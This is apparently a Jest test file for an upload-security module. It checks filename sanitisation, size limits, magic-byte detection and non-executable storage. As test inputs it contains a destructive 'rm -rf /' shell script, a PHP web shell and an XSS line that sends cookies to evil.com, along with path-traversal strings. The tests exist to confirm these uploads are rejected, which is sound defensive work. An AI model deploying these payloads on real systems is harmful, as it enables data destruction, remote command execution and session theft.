import fs from 'fs';
import path from 'path';
import crypto from 'crypto';
import {
  validateFileBuffer,
  sanitizeFileName,
  SecureStorageManager,
  DEFAULT_MAX_FILE_SIZE,
  CERT_MAX_FILE_SIZE,
  ALLOWED_EXTENSIONS,
  FORBIDDEN_EXTENSIONS,
} from '../src/lib/file-security';

describe('File Security & Non-Executable Upload Engine', () => {
  const testStorageDir = path.resolve(process.cwd(), 'storage', 'test_secure_uploads');
  let testStorage: SecureStorageManager;

  beforeAll(() => {
    testStorage = new SecureStorageManager(testStorageDir);
  });

  afterAll(() => {
    try {
      if (fs.existsSync(testStorageDir)) {
        fs.rmSync(testStorageDir, { recursive: true, force: true });
      }
    } catch {}
  });

  describe('1. File Name & Extension Sanitization', () => {
    it('approves legitimate cryptographic and document extensions', () => {
      const allowed = ['certificate.pem', 'request.csr', 'report.pdf', 'data.json', 'image.png', 'notes.txt'];
      for (const name of allowed) {
        const res = sanitizeFileName(name);
        expect(res.valid).toBe(true);
        expect(res.safeName).toBeTruthy();
      }
    });

    it('rejects executable and active script extensions', () => {
      const forbidden = [
        'payload.exe',
        'run.sh',
        'script.bat',
        'test.ps1',
        'exploit.php',
        'backdoor.phtml',
        'app.js',
        'code.py',
        'trojan.dll',
        'vector.svg',
        'page.html',
        'index.htm',
      ];
      for (const name of forbidden) {
        const res = sanitizeFileName(name);
        expect(res.valid).toBe(false);
        expect(res.error).toMatch(/forbidden executable|not permitted/i);
      }
    });

    it('detects and rejects multi-extension / double-extension evasion attacks', () => {
      const multiExt = [
        'invoice.php.png',
        'report.pdf.exe',
        'cert.pem.sh',
        'image.png.php',
        'data.json.js',
      ];
      for (const name of multiExt) {
        const res = sanitizeFileName(name);
        expect(res.valid).toBe(false);
        expect(res.error).toMatch(/forbidden executable extension segment/i);
      }
    });

    it('blocks directory traversal attempts in filenames', () => {
      const traversal = ['../../etc/passwd.txt', '..\\..\\Windows\\System32\\calc.txt', 'foo/bar/cert.pem'];
      for (const name of traversal) {
        const res = sanitizeFileName(name);
        expect(res.valid).toBe(true);
        expect(res.safeName).not.toContain('..');
        expect(res.safeName).not.toContain('/');
        expect(res.safeName).not.toContain('\\');
      }
    });

    it('rejects hidden dotfiles (.env, .htaccess, etc.)', () => {
      const dotfiles = ['.env', '.htaccess', '.bashrc', '.config.txt'];
      for (const name of dotfiles) {
        const res = sanitizeFileName(name);
        expect(res.valid).toBe(false);
        expect(res.error).toMatch(/hidden files and dotfiles/i);
      }
    });
  });

  describe('2. File Size Validation', () => {
    it('rejects zero-byte empty files', () => {
      const emptyBuffer = Buffer.alloc(0);
      const res = validateFileBuffer(emptyBuffer, 'test.txt');
      expect(res.valid).toBe(false);
      expect(res.error).toMatch(/0 bytes/i);
    });

    it('rejects files exceeding the maximum size limit', () => {
      // 1 MB limit test
      const largeBuffer = Buffer.alloc(1024 * 1024 + 50);
      const res = validateFileBuffer(largeBuffer, 'data.txt', { maxSize: 1024 * 1024 });
      expect(res.valid).toBe(false);
      expect(res.error).toMatch(/exceeds maximum allowable limit/i);
    });

    it('accepts files within the size limit', () => {
      const validBuffer = Buffer.from('Valid plain text content for testing.');
      const res = validateFileBuffer(validBuffer, 'document.txt', { maxSize: DEFAULT_MAX_FILE_SIZE });
      expect(res.valid).toBe(true);
    });
  });

  describe('3. Magic Byte & Executable Signature Inspection', () => {
    it('detects and rejects Windows PE/EXE binaries disguised as PEM or PDF', () => {
      // PE header begins with "MZ" (0x4D, 0x5A)
      const fakePem = Buffer.concat([Buffer.from([0x4D, 0x5A, 0x90, 0x00]), Buffer.from('-----BEGIN CERTIFICATE-----')]);
      const res = validateFileBuffer(fakePem, 'certificate.pem');
      expect(res.valid).toBe(false);
      expect(res.error).toMatch(/Executable binary signature detected.*Windows PE/i);
    });

    it('detects and rejects Linux ELF binaries disguised as TXT or CRT', () => {
      // ELF header begins with \x7fELF (0x7F, 0x45, 0x4C, 0x46)
      const fakeTxt = Buffer.concat([Buffer.from([0x7F, 0x45, 0x4C, 0x46]), Buffer.from('legitimate text')]);
      const res = validateFileBuffer(fakeTxt, 'output.txt');
      expect(res.valid).toBe(false);
      expect(res.error).toMatch(/Executable binary signature detected.*Linux\/Unix ELF/i);
    });

    it('detects and rejects Java Class / Bytecode disguised as ZIP or PDF', () => {
      // Java class header: 0xCA, 0xFE, 0xBA, 0xBE
      const fakeZip = Buffer.from([0xCA, 0xFE, 0xBA, 0xBE, 0x00, 0x00, 0x00, 0x34]);
      const res = validateFileBuffer(fakeZip, 'bundle.zip');
      expect(res.valid).toBe(false);
      expect(res.error).toMatch(/Executable binary signature detected/i);
    });

    it('detects and rejects shell scripts with shebang headers', () => {
      const shebangScript = Buffer.from('#!/bin/bash\nrm -rf /');
      const res = validateFileBuffer(shebangScript, 'script_disguised.txt');
      expect(res.valid).toBe(false);
      expect(res.error).toMatch(/Executable binary signature detected.*Shell Shebang/i);
    });

    it('detects and rejects embedded PHP tags disguised as images or text', () => {
      const phpPayload = Buffer.from('<?php system($_GET["cmd"]); ?>');
      const res = validateFileBuffer(phpPayload, 'image.png');
      expect(res.valid).toBe(false);
      expect(res.error).toMatch(/active script or html tags detected/i);
    });

    it('detects and rejects embedded HTML / Script tags in uploads', () => {
      const htmlPayload = Buffer.from('<script>document.location="http://evil.com/"+document.cookie</script>');
      const res = validateFileBuffer(htmlPayload, 'notes.txt');
      expect(res.valid).toBe(false);
      expect(res.error).toMatch(/active script or html tags detected/i);
    });

    it('validates genuine PDF magic header (%PDF-)', () => {
      const realPdf = Buffer.from('%PDF-1.7\n%Valid minimal PDF header');
      const res = validateFileBuffer(realPdf, 'report.pdf');
      expect(res.valid).toBe(true);
      expect(res.detectedType).toBe('application/pdf');

      const corruptPdf = Buffer.from('NOT A PDF FILE');
      const badRes = validateFileBuffer(corruptPdf, 'report.pdf');
      expect(badRes.valid).toBe(false);
      expect(badRes.error).toMatch(/Missing %PDF- magic signature/i);
    });

    it('validates genuine PNG magic bytes (0x89PNG)', () => {
      const realPng = Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00]);
      const res = validateFileBuffer(realPng, 'avatar.png');
      expect(res.valid).toBe(true);
      expect(res.detectedType).toBe('image/png');

      const spoofedPng = Buffer.from([0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77]);
      const badRes = validateFileBuffer(spoofedPng, 'avatar.png');
      expect(badRes.valid).toBe(false);
      expect(badRes.error).toMatch(/Corrupt or spoofed PNG signature/i);
    });
  });

  describe('4. Secure Isolated Storage & Execution Prevention', () => {
    it('creates isolation shield files (.htaccess and web.config) in the storage directory', () => {
      const htaccessPath = path.join(testStorageDir, '.htaccess');
      const webConfigPath = path.join(testStorageDir, 'web.config');

      expect(fs.existsSync(htaccessPath)).toBe(true);
      expect(fs.existsSync(webConfigPath)).toBe(true);

      const htaccessContent = fs.readFileSync(htaccessPath, 'utf-8');
      expect(htaccessContent).toContain('Options -ExecCGI -Indexes');
      expect(htaccessContent).toContain('Deny from all');

      const webConfigContent = fs.readFileSync(webConfigPath, 'utf-8');
      expect(webConfigContent).toContain('accessPolicy="None"');
      expect(webConfigContent).toContain('<deny users="*" />');
    });

    it('stores files using randomized inert identifiers (.inert) instead of user filenames', async () => {
      const validContent = Buffer.from('-----BEGIN CERTIFICATE-----\nMIIB...test...\n-----END CERTIFICATE-----');
      const descriptor = await testStorage.storeFile(validContent, 'my_secret_cert.pem');

      expect(descriptor.fileId).toMatch(/^file_/);
      expect(descriptor.storageName).toMatch(/^file_.*\.inert$/);
      expect(descriptor.storageName).not.toContain('my_secret_cert');
      expect(descriptor.sanitizedName).toBe('my_secret_cert.pem');

      // Verify file exists on disk with inert name
      expect(fs.existsSync(descriptor.storagePath)).toBe(true);

      // Verify non-executable disk read
      const readBack = testStorage.readFile(descriptor.storageName);
      expect(readBack.toString('utf-8')).toBe(validContent.toString('utf-8'));
    });

    it('blocks path traversal when attempting to access files from storage manager', () => {
      expect(() => {
        testStorage.getFilePath('../../package.json');
      }).toThrow();
    });

    it('verifies storage location is outside any public web root', () => {
      const storageDir = testStorage.getStorageDirectory();
      const webPublicDir = path.resolve(process.cwd(), 'apps', 'web', 'public');
      const apiDistDir = path.resolve(process.cwd(), 'apps', 'api', 'dist');

      expect(storageDir.startsWith(webPublicDir)).toBe(false);
      expect(storageDir.startsWith(apiDistDir)).toBe(false);
    });

    it('cleanly deletes file from storage', async () => {
      const content = Buffer.from('Test file for deletion.');
      const descriptor = await testStorage.storeFile(content, 'delete_me.txt');

      expect(fs.existsSync(descriptor.storagePath)).toBe(true);
      const deleted = testStorage.deleteFile(descriptor.storageName);
      expect(deleted).toBe(true);
      expect(fs.existsSync(descriptor.storagePath)).toBe(false);
    });
  });
});
